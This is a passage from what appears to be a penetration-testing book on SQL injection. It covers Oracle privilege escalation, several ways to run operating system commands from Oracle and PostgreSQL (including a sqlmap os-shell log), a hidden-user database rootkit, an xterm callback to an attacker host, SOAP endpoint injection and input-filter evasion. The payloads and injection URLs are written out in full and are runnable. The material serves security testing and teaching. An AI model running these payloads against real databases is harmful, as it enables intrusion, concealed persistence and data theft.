\\foo.dll.  \n• Create the executable from a passed string:  \n1. Create an executable.  \n2. Unpack the executable into HEX:  \nFile.open(“moo.dll”,“rb”).read().unpack(“H ∗”) \n[“4d5a90000300000004000000ffff0……]  \n3. Call CREATE ASSEMBLY MOO  from 0x4d5a90000300000004000000ffff0.  \nThe question that remains is what level of trust is given to these executables, considering the \nrobust trust levels afforded through .NET. A full discussion of the .NET tr ust levels is beyond \nthe scope of this book, but for completeness they are as follows:  \n• SAFE:  \n• Perform calculations.  \n• No access to external resources.  \n• EXTERNAL_ACCESS:  \n• Access to the disk.  \n• Access to the environment. \n• Almost full access with some restrictions.  \n• UNSAFE:  \n• Equivalent of full trust. • Call unmanaged code.  \n• Do anything as SYSTEM.  \nOur goal would obviously be to be able to load a binary as UNSAFE. To do this, however, \nrequires that our binary be signed duri ng development and that our key be trusted to the \ndatabase. This would seem like too much of a mission to overcome through injection, but we \nare afforded a way out, since we can simply set the database to “Trustworthy” to bypass this limitation.  \nThis allow s us to create a .NET binary with no limitations and then import it into the system \nwith permission set to UNSAFE (see Figure 6.23).  \n \nFigure 6.23  Creating an UNSAFE Binary by Making the Database “Trustworthy”  \nOracle  \nOracle offers various documented and undocumented possibilities for running operating system commands. Before we talk about code execution on an Oracle database, it is important to understand that code execution typically requires the database user to have DBA privileges, and ther efore the following section talks about some standard privilege escalation approaches \nto escalate permissions and gain the DBA role. The following examples assume login access to the Oracle database, however these approaches can also be leveraged from a SQ L injection \nvulnerability by using \ndbms_xmlquery.newcontext()  or dbms_xmlquery.getxml() , as discussed in \nChapter 4  (“Exploiting Oracle from Web Applications”). \nPrivilege Escalation  \nAn Oracle database typically requires  the user to have DBA permissions in order to execute \noperating system code. A common method of gaining these permissions is through the many security vulnerabilities allowing privilege escalation that has been reported over time, and in many cases not pat ched. In this section we will have a look at some of these vulnerabilities and \ntheir exploitation. The vulnerabilities have all been patched by Oracle as part of their quarterly Critical Patch Update (CPU) process, however in many cases Oracle installation s may not have \npatches installed on a timely basis, if at all.  \n\nBefore we dive into privilege escalation attacks it is important to understand the privileges \nwith which a particular PL/SQL block (e.g. function, procedures, triggers, views, etc.) gets \nexecut ed. Under Oracle there are two modes of execution privileges —definer and invoker. By \ndefault, PL/SQL procedures and functions  execute with the privilege of definer. To change the \nexecution privileges from definer to Invoker the ‘ AUTHID CURRENT_USER ’ keywor d must be \ndefined within the function/procedure’s definition. As Oracle ships a number of default packages containing numerous objects (tables, views, functions, procedures, etc.), these default objects have been a common source of flaws found by security researchers. The majority of the problems have involved SQL injection flaws within these default procedures. As these procedures execute with definer privileges, and as they belong within the SYS schema, the SQL injection vulnerability allows an attacker to execute arbitrary SQL with SYS privileges, \nproviding the highest level of access. The end result is that the attacker can grant himself the \nDBA role and gain unrestricted access to the back -end database.  \nAs an example the April 2009 Critical Patch Update fixed a critical security flaw in the \nSYS.LT package. The procedure SYS.LT.MERGEWORKSPACE was executable by the PUBLIC role (therefore allowing all users within the back -end database to have execute \npermissions) and was vulnerable to SQL injection. This c an be demonstrated as follows. First \nwe first connect to the back- end database as an unprivileged user (in this case SCOTT) as \nshown below (see Figure 6.24).  \n \nFigure 6.24  Connecting and Listing Permissions  \nNext, we create a function that we inject into the vulnerable procedures \nSYS.LT.MERGEWORKSPACE and SYS.LT.REMOVEWORKSPACE. The result of the \n\ndefined function SCOTT.X(), when executed with SYS privileges by the vulnerable \nprocedures, is to add the DBA role to the user SCOTT as shown below (see Figure 6.25).  \n \nFigure 6.25  Creating a Function and Injecting into the Vulnerable Procedure  \nThe table user_role_privs confi rms that the SCOTT user now has the DBA role as shown \nbelow (see Figure 6.26).  \n \nFigure 6.26  DBA Role Gained  \nSimilarly, there are other exploits publicly available that allow privilege escalation attacks. \nOther than vulnerabilities arising from missing security patches, it is common for instances of \nexcessive or insecure privileges to be granted to Oracle users. These can also allow privilege \nescalation attacks and in some cases a database user can gain DBA role.  \nFor example, let’s consider a database user with the privileges CREATE ANY \nPROCEDURE and EXECUTE ANY PROCEDURE. This access allows the database user to create procedures into the schema of other users. Thus, the database user can create a procedure within the SYSTEM schema:  \nCREATE OR REPLACE procedure SYSTEM.DBATEST  \n\nIS \nBEGIN  \nEXECUTE IMMEDIATE ‘GRANT DBA TO SCOTT’;  \nEND; \n/ \nThe malicious procedure created, when executed, will execute with the permissions of the \nSYSTEM user —thus allowing the user to execute any SQL statement with SYSTEM \npermi ssions. Note that the malicious procedure created in the SYSTEM  schema cannot be \ndirectly executed by the user unless he has the EXECUTE ANY PROCEDURE privilege in addition to the CREATE ANY PROCEDURE privilege:  \nEXEC SYSTEM.DBATEST();  \nCode Execution Via Di rect Access  \nDepending on the Oracle version, the following methods are available if you have direct access to an Oracle instance. Oracle EXTPROC , Java, and DBMS_SCHEDULER  are the official \nmethods from Oracle to run operating system commands. In addition to these methods, it can \nalso be possible to execute operating system code using other functionality within the database including PL/SQL native, Oracle Text, Alter system set events, PL/SQL native 9i, Buffer overflow + shell code, and Custom code  \nFor EXTPRO C and Java, the following tool can be used to automate this process:  \nwww.0xdeadbeef.info/exploits/raptor_oraexec.sql  \nEXTPROC  \nOracle database’s PL/SQL programing language can execute ext ernal procedures via \nEXTPROC, which can be abused to execute operating system commands on the Oracle database host. The following steps are needed:  \n1. A malicious user first creates a shared object (typically a DLL file or system library) that \ncontains functions which allow execution of OS code:  \n--On Windows  \nCREATE OR REPLACE LIBRARY exec_shell AS ‘C:\\ windows\\ system32\\ msvcrt.dll’;  \n--On Unix  \nCREATE OR REPLACE LIBRARY exec_shell AS ‘/lib/libc- 2.2.5.so’;  \n2. Create a procedure which calls this library’s system function:  \nCREATE OR REPLACE procedure oraexec (cmdstring IN CHAR) is external NAME “system” library \nexec_shell LANGUAGE C;  \n3. Execute the procedure:  \nexec oraexec(‘net user hacker hack3r /ADD’);  \nWhen, the  oraexec procedure is executed, the database instructs the EXTPROC to load the \nmsvcrt.dll or libc library and execute the system() function. \nRecent versions of Oracle no longer allow an external library to be present in system \ndirectories such as the ‘c: \\windows \\system32’ or ‘/lib’ locations to be loaded and registered. \nFor the above attack to work on recent versions of Oracle,  the DLL/library files must be copied \ninto the $ORACLE_HOME/bin directory. This can be done using the UTL_FILE package as \ndescribed under the section “Writing files.”  \nExecuting Code with Java  \nThe list of Java (file and execution) permissions available to the user can be obtained by issuing the following query:  \nselect ∗ from user_java_policy where grantee_name =‘ SCOTT’; \nIf the database user has the appropriate Java IO permissions, then the following two \nfunctions can be used to execute operating system code. These functions call a Java library that is shipped with Oracle and already has a method defined for executing OS code:  \n• DBMS_JAVA.RUNJAVA (Affected Systems: 11g R1, 11g R2):  \nhttp://192.168.2.10/ora8.php?name=SCOTT’ and (SELECT \nDBMS_JAVA.RUNJAVA(‘oracle/aurora/util/Wrapper c:\\ \\windows\\\\system32\\ \\cmd.exe /c \ndir>C:\\\\OUT.LST’) FROM DUAL) is not null –  \n• DBMS_JAVA_TEST.FUNCALL (Affected Systems: 9i Rel.2, 10g R2, 11g R1, 11g R2):  \nhttp://192.168.2.10/ora8.php?name=SCOTT’ and (Select \nDBMS_JAVA_TEST.FUNCALL(‘oracle/aurora/util/Wrapper’,‘main’,‘c: \\\\windows\\\\system32\\ \\cmd.exe\n’,‘/c’,‘dir>c: \\\\OUT2.LST’) FROM DUAL) is not null --  \nIn the case the user does not have the Java privileges required, it is possible that the database \nmay be vulnerable to an issue demonstrated in DBMS_JVM_EXP_PERMS  by David Litchfield \nat BlackHat in 2010. This issue (which was patched in the April 2010 CPU by Oracle) allow s a \nuser with CREATE SESSION privileges to grant themselves Java IO permissions:  \nDECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; CURSOR C1 IS SELECT \n‘‘GRANT’’,user(),‘‘SYS’’,‘‘java.io.FilePermission’’,‘‘<<ALL \nFILES>>’’,‘‘execute’’,‘‘ENABLED’’ FROM DUAL;BE GIN OPEN C1; FETCH C1 BULK COLLECT INTO \nPOL;CLOSEC1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;  \nDBMS_SCHEDULER  \nDBMS_SCHEDULER  is new since Oracle 10g and requires CREATE JOB (10g Rel. 1) or \nCREATE EXTERNAL JOB (10g Rel. 2/11g) privileges. From Version 10.2.0.2, the operating \nsystem commands are no longer executed as the user oracle , but as the user nobody : \n--Create a Program for dbms_scheduler  \nexec DBMS_SCHEDULER.create_program(‘RDS2009’,‘EXECUTABLE’, ‘c:\\ WINDOWS\\system32\\ cmd.exe /c \necho 0wned >> c:\\ rds3.txt’,0,TRUE);  \n--Create, execute, and delete a Job for dbms_scheduler  \nexec DBMS_SCHEDULER.create_job(job_name =>‘RDS2009JOB’,program_name =>‘RDS2009’,start_date \n=> NULL,repeat_interval => NULL,end_date => NULL,enabled => TRUE,auto_drop => TRUE);  \nPL/SQL Native  \nPL/SQL native in Oracle 10g/11g is undocumented, but can be the most reliable way to run \noperating system commands in Oracle 10g/11g because the commands are executed as user \nOracle. Additionally there are no special requirements as there are with Java and EXTPROC \nvariations. The only requirement for PL/SQL native is the right to modify the SPNC_COMMANDS text file on the database server. Oracle will execute everything in this file if a procedure/function/packag e is created and PL/SQL native is enabled.  \nThe following code grants DBA privileges to public  by using PL/SQL native. The \ngrant  \ncommand is a straight forward INSERT INTO SYSAUTH$  command which can normally only \nbe executed as SYS . In this example, we create a text file called e2.sql which is executed by \nsqlplus . This sqlplus  command is started via PL/SQL native: \nCREATE OR REPLACE FUNCTION F1 return number  \nauthid current_user as  \npragma autonomous_transaction;  \nv_file UTL_FILE.FILE_TYPE;  \nBEGIN  \nEXECUTE IMMEDIATE q‘!create directory TX as ‘C: \\’!’; \nbegin  \n-- grant dba to public;  \nDBMS_ADVISOR.CREATE_FILE (‘insert into sys.sysauth$ \nvalues(1,4,0,null);‘||chr(13)||chr(10)||’ exit;’, ‘TX’, ‘e2.sql’);  \nend; \nEXECUTE IMMEDIATE q‘!drop directory TX !’; \nEXECUTE IMMEDIATE q‘!create directory T as ‘C:\\ ORACLE\\ORA101\\PLSQL’!’;  \nutl_file.fremove(‘T’,‘spnc_commands’);  \nv_file:= utl_file.fopen(‘T’,‘spnc_commands’, ‘w’);  \nutl_file.put_line(v_file,‘sqlplus / as sysdba @c:\\ e2.sql’);  \nutl_file.fclose(v_file);  \nEXECUTE IMMEDIATE q‘!drop directory T!’;  \nEXECUTE IMMEDIATE q‘!alter session set plsql_compiler_flags=‘NATIVE’!’;  \nEXECUTE IMMEDIATE q‘!alter system set plsql_native_library_dir=‘C: \\’!’; \nEXECUTE IMMEDIATE q‘!create or replace procedure h1 as begin null; end;!’;  \nCOMMIT;  \nRETURN 1;  \nEND; \n/ \nOracle Text  \nOracle Text can also allow the execution of operating system commands. By using a custom \nfilter (USER_FILTER_PREF) it is possible to pass the content of a table to the custom filter. In the following example we are passing TCL code via a table to the custo m filter.  \nThere is one limitation in the usage of Oracle Text custom filters. Only executables from the \nORACLE_HOME/bin, e.g. oratclsh.exe can be executed. If this is a limitation you may be able to use the UTL_FILE package to copy the appropriate executab le to the ORACLE_HOME/bin \ndirectory in order to execute it:  \ncreate table t (id number(9) primary key, text varchar2(2000));  \nBegin  \nctxsys.ctx_ddl.drop_preference(‘USER_FILTER_PREF’);  \nend; \n/ \nbegin  \nctxsys.ctx_ddl.create_preference  \n( \npreference_name => ‘USER_FILTER_PREF’,  \nobject_name => ‘USER_FILTER’  \n); \nctxsys.ctx_ddl.set_attribute  \n(‘USER_FILTER_PREF’,‘COMMAND’,‘oratclsh.exe’);  \nend; \n/ \nbegin  \ninsert into t values (1,‘  \nset f [open “C:/AHT.txt” {RDWR CREAT}]  \nputs $f “Your System is not protected!”  \nclose $f  \nset f [open [lindex $argv 0] {RDWR CREAT}]  \nputs $f “SUCCESS”  \nclose $f  \n’); \nend; \n/ \ndrop index user_filter_idx;  \ncreate index user_filter_idx on t (text)  \nindextype is ctxsys.context  \nparameters (‘FILTER USER_FILTER_PREF’);  \nselect token_text from DR$USER_FILTER_IDX$I;  \nAlter System Set Events  \nAlter system set is an undocumented parameter (since Oracle 10g) that allows you to specify \nthe name of a custom debugger which will be executed during a debugging event, which would then need to be forced. For example:  \nalter system set “_oradbg_pathname”=‘/tmp/debug.sh’;  \nPL/SQL Native 9i  \nSince 9i Rel. 2, Oracle offers the possibility to convert PL/SQL code into C code. To increase the flexibility, Oracle allows you to change the name of t he make utility (e.g. to calc.exe or any \nother executable). For example:  \nalter system set plsql_native_make_utility=‘cmd.exe /c echo Owned > c:\\ rds.txt &’;  \nalter session set plsql_compiler_flags=‘NATIVE’;  \nCreate or replace procedure rds as begin null; end; / \nBuffer Overflows  \nIn 2004, Cesar Cerrudo published an exploit for a buffer overflow in the Oracle functions NUMTOYMINTERVAL  and NUMTODSINTERVAL  (see \nhttp://seclists.org/vulnwatch/2004/q1/0030.html ). By using the following exploit, it was \npossible to run operating system commands on the database server:  \nSELECT NUMTOYMINTERVAL \n(1,‘AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR‘||chr(59)||chr(79)||chr(150)||chr(01)\n||chr(141)||chr(68)||chr(36)||chr(18)|| chr(80)||chr(255)||chr(21)||chr(52)||chr(35)||chr(148)||chr(01)||chr(255)|| chr(37)||chr(172)||chr(33)||chr(148)||chr(01)||chr(32)||’echo ARE YOU SURE? >c:\\Unbreakable.txt’) FROM DUAL;\n \nCustom Application Code  \nIn the Oracle world, it is not uncom mon to use tables containing operating system commands. \nThese commands will be executed by an external program connecting to the database. By \nupdating such an entry in the database with the command of your choice, you can often take over systems. It’s alwa ys worth it to check all tables for columns containing operating system \ncommands. For example:  \n+----+------------------------------------ +--------------- + \n| Id| Command| Description|  \n+----+------------------------------------ +--------------- + \n| 1| sqlplus – s / as sysdba @report.sql| Run a report|  \n+----+------------------------------------ +--------------- + \n| 2| rm /tmp/∗ .tmp| Daily cleanup|  \n+----+------------------------------------ +--------------- + \nBy replacing rm /tmp/ ∗.tmp with xterm –display 192.168.2.21, sooner or later a new xterm \nwindow with Oracle privileges will appear on the attacker’s PC.  \nExecuting Code as SYSDBA  \nAn additional option for database users with SYSDBA privileges (e.g. SYS) is to use oradebug (9i Rel.2, 10g R2, 11g R1, 11g R2) to call a ny operating system command or DLL/library. It is \nimportant to note that the spaces have to be replaced with tab characters in the commands below:  \nsqlplus sys/pw@dbserver as sysdba  \nSQL> oradebug setmypid  \nSQL> oradebug call system “/bin/touch -f /home/oracle/rds.txt”Function returned 0  \nPostgreSQL  \nOne of the popular ways to execute operating system commands under PostgreSQL is by calling a user -defined function (UDF). In SQL databases, a user -defined function provides a \nmechanism for extending the functionali ty of the database server by adding a function that can \nbe evaluated in SQL statements. The SQL standard distinguishes between scalar and table \nfunctions. A scalar function returns only a single value (or NULL).  \nLike MySQL it is possible to create a UDF ba sed on the shared libraries present on the \nnative operating system. Bernardo Damele in his talk at Black Hat Europe 2009 demonstrated this technique and showed the problems with using UDF to achieve operating system code \nexecution under PostgreSQL. The mai n problem is that as of PostgreSQL Version 8.2 all \nshared libraries must include a ‘magic block,’ that is required to be added at compile time.  \nTip \nTo include a magic block, the following needs to be present in one (and only one) of the module source files , after \nhaving included the header fmgr.h:  \n# ifdef PG_MODULE_MAGIC  \nPG_MODULE_MAGIC;  \n# endif  \nAs the shared libraries present on the native operating system will not have the magic block \ndeclaration in them, we will have to upload our own shared libraries wi th this declaration. For \nPostgreSQL, the UDF can be placed in any location where the PostgreSQL user has read/write access. Typically this is /tmp under Linux/Unix systems and “c: \\windows \\temp” on the \nWindows platform. \nThe tool sqlmap has this functionalit y already built -in and an attacker can use the switch --\nos-shell to execute operating system commands. The following is the process by which sqlmap \nwill let you execute OS code and see the output of the command:  \n• Upload a custom shared library (lib_postgr esqludf_sys) in the TEMP folder.  \n• Create a function (sys_eval) using this shared library.  \n• execute the function and read the output using either a UNION or blind SQL injection \ntechnique.  \nThe following shows sqlmap in action against a PostgreSQL database:  \nroot@bt:/tmp# /pentest/database/sqlmap/sqlmap.py - u http://10.10.10.114/test.php?id=1 -- os-\nshell  \nsqlmap/0.9 -dev - automatic SQL injection and database takeover tool  \nhttp://sqlmap.sourceforge.net  \n[∗] starting at: 17:15:30  \n[17:15:30] [INFO] using ‘/pentest/database/sqlmap/output/10.10.10.114/session’ as session \nfile \n[17:15:30] [INFO] testing connection to the target url  \n[17:15:30] [INFO] testing if the url is stable, wait a few seconds  \n[17:15:31] [INFO] url is stable  \n[17:15:31] [INFO] testing if GET parameter ‘id’ is dynamic  \n[17:15:31] [INFO] confirming that GET parameter ‘id’ is dynamic  \n[17:15:31] [INFO] GET parameter ‘id’ is dynamic  \n[17:15:31] [INFO] (error based) heuristics shows that GET parameter ‘id’ is injectable \n(possible DBMS: PostgreSQL)  \n[17:15:31] [INFO] testing sql injection on GET parameter ‘id’ with 0 parenthesis  \n[17:15:31] [INFO] testing unescaped numeric (AND) injection on GET parameter ‘id’  \n[17:15:31] [INFO] confirming unescaped numeric (AND) injection on GET parameter ‘id’  \n[17:15:31] [INFO] GET parameter ‘id’ is unescaped numeric (AND) injectable with 0 \nparenthesis  \n[17:15:31] [INFO] testing if User- Agent parameter ‘User- Agent’ is dynamic  \n[17:15:31] [WARNING] User- Agent parameter ‘User -Agent’ is not dynamic  \n[17:15:31] [INFO] testing for parenthesis on injectable parameter  \n[17:15:31] [INFO] the injectable parameter requires 0 parenthesis  \n[17:15:31] [INFO] testing PostgreSQL  \n[17:15:31] [INFO] confirming PostgreSQL  \n[17:15:31] [INFO] the back- end DBMS is PostgreSQL  \nweb server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)  \nweb application technology: PHP 5.2.6, Apache 2.2.9  \nback-end DBMS: PostgreSQL  \n[17:15:31] [INFO] testing stacked queries sql injection on parameter ‘id’  \n[17:15:31] [INFO] detecting back- end DBMS version from its banner  \n[17:15:31] [INFO] retrieved: 8.3.8  \n[17:15:37] [INFO] the target url is affected by a stacked queries sql injection on parameter \n‘id’ \n[17:15:37] [INFO] fingerprinting the back- end DBMS operating system  \n[17:15:37] [INFO] the back- end DBMS operating system is Linux  \n[17:15:37] [INFO] testing if current user is DBA  \n[17:15:37] [INFO] retrieved: 1  \n[17:15:37] [INFO] checking if UDF ‘sys_eval’ already exist  \n[17:15:37] [INFO] retrieved: 0  \n[17:15:37] [INFO] checki ng if UDF ‘sys_exec’ already exist  \n[17:15:37] [INFO] retrieved: 0  \n[17:15:37] [INFO] creating UDF ‘sys_eval’ from the binary UDF file  \n[17:15:37] [INFO] creating UDF ‘sys_exec’ from the binary UDF file  \n[17:15:37] [INFO] going to use injected sys_eval and sys _exec user- defined functions for \noperating system command execution  \n[17:15:37] [INFO] calling Linux OS shell. To quit type ‘x’ or ‘q’ and press ENTER  \nos-shell> id  \ndo you want to retrieve the command standard output? [Y/n/a] a  \n[17:15:41] [INFO] retrieved: uid=118(postgres) gid=127(postgres) groups=123(ssl-\ncert),127(postgres)  \ncommand standard output: ‘uid=118(postgres) gid=127(postgres) groups=123(ssl-\ncert),127(postgres)’  \nos-shell> whoami  \n[17:15:51] [INFO] retrieved: postgres  \ncommand standard output: ‘postgres’  \nConsolidating access  \nSeveral opportunities present themselves to the enterprising analyst once a full compromise \nhas been affected. In 2002, Chris Anley published his “three -byte patch” for SQL Server which \nwould effectively disable authentication on the system by reversing the logic of the conditional Jump code branch. Although this certainly looks good on TV, I cannot imagine \ntoo many customers who would happily tolerate the greater level of exposure they would endure during the course of such testing.  \nOne of this book’s contributing authors, Alexander Kornbrust, along with NGS Software’s \nDavid Litchfield have published extensively on the existence and creation of database rootkits, which effectively subvert the security of the database much like a trad itional rootkit subverts \nthe security of an operating system. These can be made that much more effective since file system rootkits have been known for about decades whereas database rootkits are a fairly new concept.  \nThe following sample code implements a n Oracle rootkit by updating a row in a table:  \n-- the following code must run as DBA  \nSQL> grant dba to hidden identified by hidden_2009; -- create a user hidden with DBA \nprivileges  \nSQL> select sys.kupp$proc.disable_multiprocess from dual; -- this SELECT statement is needed \nfor newer version of Oracle (10.2.0.5, 11.1.0.7, 11.2.0.x) to activate the identity change  \nSQL> exec sys.kupp$proc.change_user(‘SYS’); -- become user SYS  \n-- change the users record in sys.user$  \nSQL> update sys.user$ set tempts#=666 where name=‘HIDDEN’;  \n-- does not show the user HIDDEN  \nSQL> select username from dba_users;  \n-- but the connect works  \nSQL> connect hidden/hidden_2009  \nHere is a quick explanation of why this works. To display the list of users , Oracle uses the \nviews ALL_USERS  and DBA_USERS . These views contain a join among three tables. By \nsetting tempts#  (or datats#  or type# ) to a nonexistent value, you can remove the user from the \nresult of the join and from the view:  \nCREATE OR REPLACE FORCE VIEW “SYS”.“ALL_USERS” (“USERNAME”, “USER_ID”, “CREATED”) AS  \nselect u.name, u.user#, u.ctime  \nfrom sys.user$ u, sys.ts$ dts, sys.ts$ tts  \nwhere u.datats# = dts.ts#  \nand u.tempts# = tts.ts#  \nand u.type# = 1  \nYou can find further information concerning Oracle rootkits at the following Web sites:  \n• www.red -database- security.com/wp/db_rootkits_us.pdf  \n• www.databasesecurity.com/oracle -backdoors.ppt  \nIn 2008, two contributing authors of this book, Marco Slaviero and Haroon Meer, showed \nthat newer versions of SQL Server now have the native ability to expose Simple Object Acces s \nProtocol (SOAP) -based Web services through http.sys, the same kernel component that \nmanages Internet Information Server (IIS). This means that an attacker who has obtained the \nnecessary privileges can create an HTTP listener that is bound to an SQL stored procedure. The collection of images in Figure 6.27 walks through the attack. Starting from the left, we \nnote that /test returns a page on the Web server. The Query Manager windows to the right \ncreate the ENDPOINT3  endpoint on path /test. The next two frames show that the /test page \nhas now been “virtually overwritten.”  \n \nFigure 6.27  Creating SOAP Endpoints Within SQL Server  \nThe preceding example shows the strange architecture choice that allows the CREATE \nENDPOINT  command in SQL to effectively overwrite the /test page on the Web server. This \nhappens by design, because SQL S erver is given a higher priority with http.sys . \nAlthough simply creating a denial of service (DOS) condition is fun, the utility is \nsubstantially increased when you consider the possibility of linking the endpoint to a stored procedure that can accept post ed commands which are then evaluated on the server. \nFortunately, this is not needed, since SQL Server natively supports sqlbatch when creating SOAP endpoints. According to MSDN ( http://msdn.microsoft.com/en-\nus/library/ms345123.aspx ) (Sarsfield and Raghavan ): \n“When BATCHES are ENABLED on an endpoint by using the T -SQL command, another SOAP \nmethod, called “sqlbatch,” is implicitly exposed on the endpoint. The sqlbatch method allows you to \nexecute T -SQL statements via SOAP.”  \nThis means that faced with the simple injection point used in previous examples, we can \nissue our request to create the SOAP endpoint we need:  \n\nusername=‘ exec(‘CREATE ENDPOINT ep2 STATE=STARTED AS HTTP (AUTHENTICATION = \n(INTEGRATED),PATH = ‘‘/sp’’,PORTS=(CLEAR))FOR SOAP (BATCHES=ENABLED)’)—  \nThis creates a SOAP endpoint on the victim server on /sp , allowing us to aim a SOAP \nrequest (with an embedded SQL query) at the endpoint. Figure 6.28 shows a tiny Perl -based \nSOAP query tool that you can use to talk to t he newly created endpoint.  \n \nFigure 6.28  A Perl -Based SOAP Query to the Created Endpoint  \n \nSummary  \nThis chapter demonstrated how SQL injection attacks can be used to attack the host on which \nthe database server is running. The ability to read and write files to the file system and the \nability to execute operating system commands is built into most modern R DBMSs today, and \nthis by extension means that this functionality is available to most SQL injection attackers.  \nThe ability to use a single vulnerability such as a discovered SQL injection point as a \nbeachhead to launch attacks at other hosts is one of thos e penetration testing techniques that \nseparates the men from the boys. This chapter covered how simple primitives such as file reading, file writing, and command execution can be used within SQL injection attacks against the most prominent application architectures.  \nWith these primitives under your belt, you can move on to Chapter 7 , which covers \nadvanced SQL injection topics. \n \n \n \n\nSolutions fast track  \nAccessing the File System  \n• The following pertains to reading files from the file system using SQL injection: \nIn MySQL, you can use the LOAD DATA INFILE and LOAD_FILE()  commands to read \narbitrary files from the host.  \nIn Microsoft SQL Server, you can read files from the file system using BULK INSERT  or \nOLE Automation. On newer s ystems (SQL Server 2005 and later), you can use a quirk in \nthe CREATE ASSEMBLY  methods to read files from the file system.  \nIn Oracle, you can read files using Oracle Directory, Oracle Text, or the UTL_FILE method.  \n• The following pertains to writing files to the file system using SQL injection: \nIn MySQL, you can write files to the file system by using the select into outfile  and select \ninto dumpfile  commands. \nIn Microsoft SQL Server, you can use OLE Automation and simple redirection (through \ncommand execution) to create files on the target file system. You can use debug.exe and \nBCP from the command line to assist with creating binaries on the target.  \nIn Oracle,  you can accomplish file writing using UTL_FILE, DBMS_ADVISOR,  \nDBMS_XSLPROCESSOR, DBMS_XMLDOM, Java, or operating system commands and standard redirection. \nExecuting Operating System Commands  \n• In MySQL and PostgreSQL, you can execute operating system comm ands through SQL by \ncreating a user -defined function (UDF), PostgreSQL supports execution of stacked queries \nmaking this attack very likely. sqlmap is recommended for this attack. Most Web frameworks do not allow execution of stacked queries for MySQL and hence the attack in \nMySQL is not likely to work. The database user must be a sysadmin user to create a user -\ndefined function. In Microsoft SQL Server, you can execute commands via stored procedures such as xp_cmdshell , via OLE Automation, or through the ne w CLR integration \nfeatures. The database user must have the sysadmin role to be able to execute OS code.  \n• In Oracle, you can execute commands th rough EXTPROC, Java, DBMS_SCHEDULER, \nPL/SQL, Oracle Text, or oradebug. Even if the database user does not have adequate \npermissions to execute code, privilege escalation attacks can be carried out when the \ndatabase has missing security patches.  \nConsolidating Access  \n• You can use database rootkits to ensure repeat access to compromised servers.  \n• Database Rootkits c an vary in complexity, from adding functionality to the database server to \nsimply adding users to the system who do not show up with regular detection. \n \nReferences  \n1. Rathakrishnan, B., et al. Using CLR integration in SQL Server 2005. Microsoft Corporation.  \n<http://msdn.microsoft.com/en -us/library/ms345136.aspx > Accessed 12.02.09.  \n2. {}, & Hardbeat. How we defaced www.apache.org . \n<http://www.dataloss.net/papers/how.defaced.apache.org.txt > Accessed 12.02.09.  \n3. Foller, A. Custom xp_cmdshell, using shell object. Motobit Software. \n<http://www.motobit.com/tips/detpg_cmdshell/> Accessed 06.02.09.  \n4. Sarsfield, B., & Raghavan, S. Overview of native XML Web Services for Microsoft SQL Server 2005. \nMicrosoft Corporation. < http://msdn.microsoft.com/en -us/library/ms345123(SQL.90).aspx > Accessed \n06.02.09.  \nFrequently Asked Questions  \nQ: Are all database back ends equal when it comes to SQL injection attacks?  \nA: Although conventional wisdom has always held that attacks are equally lethal across the \ndifferent RDBMSs, I feel that the ability to run chained or stacked queries (as supported by SQL Server) makes injection attacks against Microsoft SQL Server a much easier target for potential attackers.  \nQ: Are special  permissions needed for reading and writing files to the host operating system or \ncan this be done by anyone?  \nA: This generally varies from system to system, but it is safe to assume that some sort of \nelevated credentials are generally required.  \nQ: So, why  would I care whether I can read or write files?  \nA: Attackers have shown outstanding creativity over the years in translating the ability to read \nor write files on a compromised host to a full host compromise. The ability to read arbitrary \nfiles from the f ile system of a distant database server often provides a goldmine of stored \nconnection strings that allow an attacker to aim at other hosts deeper in the company’s network.  \nQ: Would not securing the database configuration solve these problems?  \nA: Hardening  the database configuration goes a long way toward preventing such attacks. In \ntheory, all SQL injection attacks can be prevented with tight configuration and well -written \ncode. In practice, however, this is far easier said than done. Security is a difficu lt game because \nit pits human against human, and some humans choose to spend huge amounts of time figuring ways around secure configurations. \n \n \n \n \n \n \n \n \n \nChapter 7  \nAdvanced topics  \nDafydd Stuttard \nSolutions in this chapter:  \n• Evading Input Filters  \n• Exploiting Second- Order SQL Injection  \n• Exploiting Client- Side SQL Injection  \n• Using Hybrid Attacks  \nIntroduction  \nIn the chapters so far, we have examined various techniques for finding, confirming, and \nexploiting SQL injection vulnerabilities in typical situations. Sometimes, however, you will encounter more challenging cases where you will need to expand these techn iques to handle \nsome unusual features of an application, or combine them with other exploits to deliver a successful attack.  \nIn this chapter, we’ll explore more advanced techniques which you can use to enhance your \nSQL injection attacks, and to overcome obstacles that you may encounter. We’ll discuss methods for evading input validation filters, and look at various ways in which you can bypass defenses such as Web application firewalls. I’ll introduce second- order SQL injection, a \nsubtler case of the vulner ability, which you can leverage in cases where the kinds of attacks \ndescribed so far are blocked. We look at client -side SQL injection vulnerabilities, which can \narise with the new client -side database features introduced in HTML5. Finally, we’ll discuss \nhybrid attacks, where you can combine SQL injection exploits with other attack techniques to \ndeliver a more complex attack and compromise even relatively well -defended applications.  \n \n \nEvading input filters  \nWeb applications frequently employ input filters that are designed to defend against common \nattacks, including SQL injection. These filters may exist within the application’s own code, in the form of custom input validation, or may be implemented outside t he application, in the \nform of Web application firewalls (WAFs) or intrusion prevention systems (IPSs).  \nIn the context of SQL injection attacks, the most interesting filters you are likely to \nencounter are those which attempt to block any input containing one or more of the following:  \n• SQL keywords, such as SELECT , AND , INSERT , and so on. \n• Specific individual characters, such as quotation marks or hyphens.  \n• Whitespace.  \nYou may also encounter filters which, rather than blocking input containing the items in the \npreceding list, attempt to modify the input to make it safe, either by encoding or escaping problematic characters or by stripping the offending items from the input and processing what is left in the normal way.  \nOften, the application code that the se filters protect is vulnerable to SQL injection, and to \nexploit the vulnerability you need to find a means of evading the filter to pass your malicious input to the vulnerable code. In the next few sections, we will examine some techniques that \nyou can use to do just that. \nUsing Case Variation  \nIf a keyword -blocking filter is particularly naïve, you may be able to circumvent it by varying \nthe case of the characters in your attack string, because the database handles SQL keywords in a case -insensitive manne r. For example, if the following input is being blocked:  \n‘ UNION SELECT password FROM tblUsers WHERE username=‘admin’--  \nyou may be able to bypass the filter using the following alterative:  \n‘ uNiOn SeLeCt password FrOm tblUsers WhErE username=‘admin’--  \nUsin g SQL Comments  \nYou can use inline comment sequences to create snippets of SQL which are syntactically \nunusual but perfectly valid, and which bypass various kinds of input filters. \nYou can circumvent various simple pattern- matching filters in this way. For example, a \nrecent vulnerability in the phpShop application (see http://seclists.org/bugtraq/2008/Feb/0013.html ) employed the following input filter in an 